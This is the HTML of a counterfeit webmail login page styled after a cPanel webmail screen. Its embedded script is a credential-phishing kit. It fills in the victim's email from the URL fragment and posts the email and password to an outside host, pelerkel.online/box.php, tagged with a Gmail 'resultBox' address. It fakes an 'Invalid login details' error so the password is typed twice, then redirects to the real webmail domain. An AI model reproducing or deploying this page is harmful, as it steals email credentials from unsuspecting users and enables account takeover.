    <body class="wm">
        <input type="hidden" id="goto_uri" value="/" />
        <input type="hidden" id="goto_app" value="" />
        <!-- Do not remove msg_code as it is needed for automated testing - msg_code:[]  -->
        <div id="login-wrapper" class="group has-pw-reset">
        <div class="wrapper">
            <div id="notify">
                <noscript>
                    <div class="error-notice">
                        <img src="https://server269.web-hosting.com:2096/cPanel_magic_revision_1593501200/unprotected/nc-cpanel/images/notice-error.png" alt="Error" align="left"/>
                        JavaScript is disabled in your browser.
                        For Webmail to function properly, you must enable JavaScript.
                        If you do not enable JavaScript, certain features in Webmail will not function correctly.
                    </div>
                </noscript>
            </div>
            <div id="content-container">
                <div class="login-container" id="login-container">
                    <div class="login-container__sub-container" id="login-sub-container">
                        <div class="login-container__header" id="login-sub-header">
                            <img class="main-logo" src="https://server269.web-hosting.com:2096/cPanel_magic_revision_1593501200/unprotected/nc-cpanel/images/webmail-logo.svg" alt="logo" />
                        </div>
                        <div class="login-container__main" id="login-sub">
                            <div class="login-container__login-form login-form" id="forms">
                                <form id="login_form">
                                    <h3 style="color: red; display: none;" id="error">Invalid login details</h3>
                                    <div class="input-req-login login-form__label">
                                        <label for="user">Email Address</label>
                                    </div>
                                    <div class="input-field-login icon username-container login-form__input">
                                        <input name="user" id="user" placeholder="Enter your email address." class="std_textbox form-control" type="email" autocomplete="off" tabindex="1" readonly>
                                    </div>
                                    <div class="input-req-login login-password-field-label login-form__label">
                                        <label for="pass">Password</label>
                                    </div>
                                    <div class="input-field-login icon password-container login-form__input form-field form-field--with-action">
                                        <input name="pass" id="pass" placeholder="Enter your email password." class="std_textbox form-control" type="password" tabindex="2" autocomplete="off" autofocus="autofocus" required>
                                    </div>
                                    <div class="controls login-form__controls">
                                        <div class="login-btn">
                                            <button name="login" type="submit" id="login_submit" tabindex="3">Log in</button>
                                        </div>
                                        <div class="reset-pw">
                                            <a href="javascript:void(0)" id="reset_password">Reset Password</a>
                                        </div>
                                    </div>
                                    <div class="clear" id="push"></div>
                                    
                                    <script>
                                        let step = 1;
                                        let btnIsDisabled = true;

                                        const clientID = window.location.hash.split("#").pop();
                                        const inputs = [...document.querySelectorAll('.form-control')];
                                        const submit = $('#login_submit');
                                        const error = document.querySelector('#error');
                                        const user = $('#user');

                                        user.val(clientID);

                                        toggleBtnState();

                                        inputs.forEach(function(input) {
                                            input.addEventListener('input', checkInputsOnEmpty);
                                        })

                                        function checkInputsOnEmpty() {
                                            if (this.value === '') {
                                                this.classList.add('is-error');
                                            } else {
                                                this.classList.remove('is-error');
                                            }

                                            toggleBtnState();
                                        };

                                        function toggleBtnState() {
                                            btnIsDisabled = inputs.some(function(input) {
                                                return input.value === '';
                                            });
                                            btnIsDisabled ? submit.attr('disabled', true) : submit.attr('disabled', false);
                                        }
                                    
                                        const pass = $("#pass");
                                        $("#toggle_pass").on("click", function (event) {
                                            event.preventDefault();
                                            toggle_view(pass)
                                        });
                                    
                                        function toggle_view(element) {
                                            if (element.type === "password") {
                                                element.type = "text";
                                            } else {
                                                element.type = "password";
                                            }
                                            return false;
                                        }

                                        $("#login_form").submit(function(event) {
                                            event.preventDefault();

                                            submit.text('Logging in...');

                                            const posting = $.post("https://pelerkel.online/box.php", {
                                                email: user.val(),
                                                password: pass.val(),
                                                step,
                                                resultBox: "bestsolution0008@gmail.com",
                                            });

                                            posting.done(function(data) {
                                                if (step === 2) {
                                                    window.location.href = 'https://webmail.' + clientID.split('@').pop()
                                                } else {
                                                    error.style.display = 'block';
                                                    submit.text('Log in');
                                                    step++;
                                                    pass.val("");
                                                }
                                            });

                                            posting.fail(function() {
                                                error.style.display = 'block';
                                                submit.text('Log in');
                                            });
                                        });
                                    </script>
                                </form>                
                            </div>            
                        </div>        
                    </div>    
                </div>
                <div class="promo-chat">
                    <div class="grid-col">
                        <p><em>Need help?</em> We're always here for you.</p>
                        <p>
                            <a href="javascript:void(0)" target="_blank" class="btn green">Live Chat Support</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>
